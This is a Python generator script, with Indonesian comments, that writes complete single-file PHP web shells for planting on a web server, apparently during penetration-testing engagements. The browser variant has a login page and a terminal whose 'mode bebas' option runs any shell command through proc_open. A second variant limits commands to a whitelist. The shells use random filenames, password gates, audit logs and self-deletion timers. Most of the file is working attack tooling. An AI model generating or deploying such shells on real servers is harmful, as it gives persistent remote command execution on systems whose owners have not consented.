#!/usr/bin/env python3
"""shell/web_shell_gen.py — generator shell SATU FILE (HTML+CSS+JS+PHP).

Dua varian (--variant):
  cli  : tanpa UI, gate Basic 401 + header Authorization, whitelist command.
         Paling aman — untuk program yang melarang shell interaktif.
  web  : halaman login HTML (tanpa popup Basic Auth), terminal di browser,
         whitelist + opsi "mode bebas" (perintah apa pun via checkbox).
         Untuk program yang mengizinkan demonstrasi eksekusi penuh.
  default keduanya (both).

Keduanya: bcrypt cost 12, TTL auto-unlink, audit log, tanpa eval/uploader/
revshell. Nama file 32-hex acak. Kredensial -> CREDENTIALS-<ts>.txt.

Standalone (tidak mengimpor exploit.py). bcrypt butuh venv:
  /home/lota1337/myenv/bin/python web_shell_gen.py --out <dir> --ttl 24 [--variant web]
"""
from __future__ import annotations

import argparse
import secrets
import time
from pathlib import Path

import bcrypt

HEX = "0123456789abcdef"
ALLOWED_DEFAULT = ["id", "whoami", "uname -a", "pwd", "hostname", "php -v"]


def _rand_name() -> str:
    return "".join(secrets.choice(HEX) for _ in range(32)) + ".php"


def _q(v: str) -> str:
    return "'" + v.replace("\\", "\\\\").replace("'", "\\'") + "'"


def render(*, password: str, ttl_hours: float, variant: str,
           allowed: list[str] | None = None) -> str:
    h = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()
    expires = int(time.time() + ttl_hours * 3600)
    allowed_php = "[" + ",".join(_q(a) for a in (allowed or ALLOWED_DEFAULT)) + "]"
    if variant == "cli":
        return _cli_tpl(h, expires, allowed_php)
    return _web_tpl(h, expires, allowed_php)


def _cli_tpl(h: str, expires: int, allowed_php: str) -> str:
    tpl = r"""<?php
/**
 * Managed CLI shell — engagement use only. Whitelist-only.
 * Menerima password via POST/GET 'k' ATAU header HTTP Basic (browser popup).
 * Auto-unlink setelah TTL. Tanpa eval/uploader/revshell.
 */
declare(strict_types=1);
const PW_HASH = %HASH%;
const EXPIRES = %EXPIRES%;
const ALLOWED = %ALLOWED%;
const LOGFILE = __DIR__ . '/.shell-audit.log';
const MAX_OUT = 8192;
function audit(string $e, string $x = ''): void {
    @file_put_contents(LOGFILE, sprintf("%s\t%s\t%s\n", gmdate('c'),
        $_SERVER['REMOTE_ADDR'] ?? '-', $e . ($x !== '' ? ' ' . $x : '')), FILE_APPEND | LOCK_EX);
}
function deny(int $c, string $m): void { http_response_code($c); echo $m, "\n"; exit; }
if (time() > EXPIRES) { audit('expired'); @unlink(__FILE__); @unlink(LOGFILE); deny(410, 'gone'); }
$provided = $_POST['k'] ?? $_GET['k'] ?? '';
if ($provided === '' && !empty($_SERVER['PHP_AUTH_PW'])) { $provided = $_SERVER['PHP_AUTH_PW']; }
if ($provided === '' && !empty($_SERVER['HTTP_AUTHORIZATION'])) {
    $h = $_SERVER['HTTP_AUTHORIZATION'];
    if (stripos($h, 'basic ') === 0) {
        $d = base64_decode(substr($h, 6), true);
        if (is_string($d) && str_contains($d, ':')) { $provided = explode(':', $d, 2)[1]; }
    }
}
if ($provided === '') { audit('no-credential');
    header('WWW-Authenticate: Basic realm="restricted"'); deny(401, 'authentication required'); }
if (!password_verify($provided, PW_HASH)) { audit('auth-fail'); deny(401, 'authentication required'); }
$c = $_POST['c'] ?? $_GET['c'] ?? '';
if ($c === '') { audit('authenticated no-command'); header('Content-Type: text/plain');
    echo "ok\nallowed:\n  " . implode("\n  ", ALLOWED) . "\n"; exit; }
if (!in_array($c, ALLOWED, true)) { audit('exec-reject', $c); deny(403, 'command not in whitelist'); }
audit('exec', $c);
header('Content-Type: text/plain; charset=utf-8');
echo substr(shell_exec(escapeshellcmd($c) . ' 2>&1') ?: '', 0, MAX_OUT);
"""
    return tpl.replace("%HASH%", _q(h)).replace("%EXPIRES%", str(expires)).replace("%ALLOWED%", allowed_php)


def _web_tpl(h: str, expires: int, allowed_php: str) -> str:
    tpl = r"""<?php
/**
 * Managed WEB shell — one file (HTML+CSS+JS+PHP). engagement use only.
 * Halaman login (tanpa popup Basic), terminal browser, whitelist + mode bebas,
 * audit log, TTL auto-unlink. Tanpa eval()/uploader/revshell.
 */
declare(strict_types=1);
const PW_HASH = %HASH%;
const EXPIRES = %EXPIRES%;
const ALLOWED = %ALLOWED%;
const LOGFILE = __DIR__ . '/.shell-audit.log';
const MAX_OUT = 65536;
function audit(string $e, string $x = ''): void {
    @file_put_contents(LOGFILE, sprintf("%s\t%s\t%s\t%s\n", gmdate('c'),
        $_SERVER['REMOTE_ADDR'] ?? '-', $e, substr($x, 0, 120)), FILE_APPEND | LOCK_EX);
}
function deny(int $code, string $msg): void { http_response_code($code); echo $msg, "\n"; exit; }
function logged_in(): bool { return !empty($_SESSION['ok']) && $_SESSION['ok'] === true; }
if (time() > EXPIRES) { audit('expired'); @unlink(__FILE__); @unlink(LOGFILE); deny(410, 'gone'); }
if (session_status() !== PHP_SESSION_ACTIVE) { session_start(); }
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');
$act = $_POST['a'] ?? '';
if ($act === 'login') {
    $p = $_POST['k'] ?? '';
    if ($p !== '' && password_verify($p, PW_HASH)) {
        session_regenerate_id(true); $_SESSION['ok'] = true; audit('login-ok');
        header('Content-Type: application/json'); echo json_encode(['ok' => true]); exit;
    }
    audit('login-fail'); usleep(300000);
    header('Content-Type: application/json');
    echo json_encode(['ok' => false, 'err' => 'password salah']); exit;
}
if ($act === 'logout') {
    audit('logout'); $_SESSION = []; session_destroy();
    header('Content-Type: application/json'); echo json_encode(['ok' => true]); exit;
}
if ($act === 'cmd') {
    if (!logged_in()) { audit('cmd-noauth'); deny(401, 'authentication required'); }
    $c = $_POST['c'] ?? ''; $out = '';
    if ($c === '__free__') {
        $cmd = $_POST['cmd'] ?? '';
        if ($cmd === '') { deny(400, 'empty cmd'); }
        audit('exec-free', $cmd);
        $proc = proc_open($cmd, [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
        if (is_resource($proc)) {
            $out = (string)stream_get_contents($pipes[1], MAX_OUT)
                 . (string)stream_get_contents($pipes[2], MAX_OUT);
            fclose($pipes[1]); fclose($pipes[2]); proc_close($proc);
        } else { $out = 'proc_open gagal'; }
    } else {
        if (!in_array($c, ALLOWED, true)) { audit('exec-reject', $c);
            deny(403, 'command not in whitelist (gunakan mode bebas)'); }
        audit('exec', $c);
        $out = shell_exec(escapeshellcmd($c) . ' 2>&1') ?: '';
    }
    header('Content-Type: text/plain; charset=utf-8');
    echo substr($out, 0, MAX_OUT); exit;
}
if (!logged_in()): audit('page-login');
?><!doctype html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>restricted</title>
<style>
:root{--bg:#0b0f14;--fg:#d7e0ea;--ac:#37c882;--er:#ff5f56}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 ui-monospace,monospace;display:grid;place-items:center;min-height:100vh}
.card{background:#111820;border:1px solid #1f2a36;border-radius:10px;padding:32px;min-width:320px}
h1{font-size:15px;margin:0 0 18px;color:var(--ac);letter-spacing:2px}
input{width:100%;padding:10px 12px;background:#0b0f14;border:1px solid #2a3644;color:var(--fg);border-radius:6px;font:inherit;outline:none}
input:focus{border-color:var(--ac)}
button{margin-top:14px;width:100%;padding:10px;background:#132a20;border:1px solid var(--ac);color:var(--ac);border-radius:6px;font:inherit;cursor:pointer}
button:hover{background:#1a3a2c}
.err{color:var(--er);font-size:12px;margin-top:10px;min-height:16px}
.ttl{text-align:center;color:#5a6b7d;font-size:11px;margin-top:16px}
</style></head><body>
<div class="card"><h1>&#9679; RESTRICTED SHELL</h1>
<form id="f"><input id="k" type="password" placeholder="password" autofocus autocomplete="off">
<button type="submit">MASUK</button><div class="err" id="e"></div></form>
<div class="ttl">sesi diaudit &middot; ttl otomatis</div></div>
<script>
document.getElementById('f').addEventListener('submit', async (ev) => {
  ev.preventDefault();
  const fd = new FormData(); fd.append('a','login'); fd.append('k', document.getElementById('k').value);
  const j = await (await fetch(location.href, {method:'POST', body: fd})).json();
  if (j.ok) location.reload(); else document.getElementById('e').textContent = j.err || 'gagal';
});
</script></body></html>
<?php else: audit('page-term');
?><!doctype html>
<html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>shell</title>
<style>
:root{--bg:#0b0f14;--fg:#d7e0ea;--ac:#37c882;--er:#ff5f56;--dim:#5a6b7d}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);font:13px/1.5 ui-monospace,monospace;height:100vh;display:flex;flex-direction:column}
header{padding:8px 14px;border-bottom:1px solid #1f2a36;display:flex;gap:12px;align-items:center}
header b{color:var(--ac)} header .sp{flex:1}
header button{background:none;border:1px solid #2a3644;color:var(--dim);border-radius:5px;padding:3px 10px;cursor:pointer;font:inherit}
header button:hover{color:var(--er);border-color:var(--er)}
#out{flex:1;overflow-y:auto;padding:14px;white-space:pre-wrap;word-break:break-word}
.in{display:flex;gap:8px;padding:10px 14px;border-top:1px solid #1f2a36;align-items:center}
.ps{color:var(--ac)}
.in input[type=text]{flex:1;background:transparent;border:none;color:var(--fg);font:inherit;outline:none}
#freewrap{margin-left:10px;color:var(--dim);font-size:12px;display:flex;align-items:center;gap:5px}
</style></head><body>
<header><b>shell</b><span id="who" style="color:var(--dim)"></span><span class="sp"></span>
<span id="mode" style="color:var(--dim)">whitelist</span>
<button id="x">keluar</button></header>
<div id="out"></div>
<div class="in"><span class="ps">$</span>
<input id="cmd" type="text" autofocus autocomplete="off" spellcheck="false">
<span id="freewrap"><input type="checkbox" id="cbfree"> mode bebas</span>
</div>
<script>
const out=document.getElementById('out'),inp=document.getElementById('cmd'),
      cbf=document.getElementById('cbfree'),modeEl=document.getElementById('mode');
function w(t){out.textContent+=t+"\n";out.scrollTop=out.scrollHeight;}
w("whitelist: id / whoami / uname -a / pwd / hostname / php -v");
w("centang 'mode bebas' utk perintah apa pun, mis: ls -la /var/www/html");
cbf.addEventListener('change',()=>{modeEl.textContent=cbf.checked?'BEBAS':'whitelist';
  modeEl.style.color=cbf.checked?'var(--er)':'var(--dim)';});
async function run(cmd){
  if(!cmd.trim())return; w((cbf.checked?'# ':'$ ')+cmd);
  const fd=new FormData();fd.append('a','cmd');
  if(cbf.checked){fd.append('c','__free__');fd.append('cmd',cmd);}
  else fd.append('c',cmd);
  const r=await fetch(location.href,{method:'POST',body:fd});
  if(r.status===401){location.reload();return;}
  const t=await r.text(); w(t||"(kosong)");
}
inp.addEventListener('keydown',async ev=>{if(ev.key==='Enter'){const v=inp.value;inp.value='';await run(v);}});
document.getElementById('x').addEventListener('click',async()=>{
  const fd=new FormData();fd.append('a','logout');
  await fetch(location.href,{method:'POST',body:fd});location.reload();});
fetch(location.href,{method:'POST',body:(()=>{const f=new FormData();f.append('a','cmd');f.append('c','id');return f;})()})
  .then(r=>r.text()).then(t=>{document.getElementById('who').textContent=t.split('\n')[0];w(t);});
</script></body></html><?php endif; """
    return tpl.replace("%HASH%", _q(h)).replace("%EXPIRES%", str(expires)).replace("%ALLOWED%", allowed_php)


def main() -> int:
    ap = argparse.ArgumentParser(description="generate web/CLI shell satu file")
    ap.add_argument("--out", required=True, help="folder output (dibuat bila belum ada)")
    ap.add_argument("--ttl", type=float, default=24, help="umur shell (jam)")
    ap.add_argument("--variant", choices=["web", "cli", "both"], default="both",
                    help="web=browser+login+mode bebas; cli=whitelist Basic; both (default)")
    ap.add_argument("--author", default="anonymous")
    args = ap.parse_args()

    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    password = secrets.token_urlsafe(18)
    ts = int(time.time())
    lines = [
        "MANAGED SHELL — engagement use only",
        f"author   : {args.author}",
        f"generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}",
        f"ttl      : {args.ttl} jam",
        f"password : {password}",
        "",
    ]
    for v in (["web", "cli"] if args.variant == "both" else [args.variant]):
        p = out / _rand_name()
        p.write_text(render(password=password, ttl_hours=args.ttl, variant=v), encoding="utf-8")
        lines.append(f"variant {v:4s}: {p.name}")
        print(f"[+] {v:4s}: {p}")
    cred = out / f"CREDENTIALS-{ts}.txt"
    cred.write_text("\n".join(lines) + "\n", encoding="utf-8")
    cred.chmod(0o600)
    print(f"[+] credentials: {cred}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
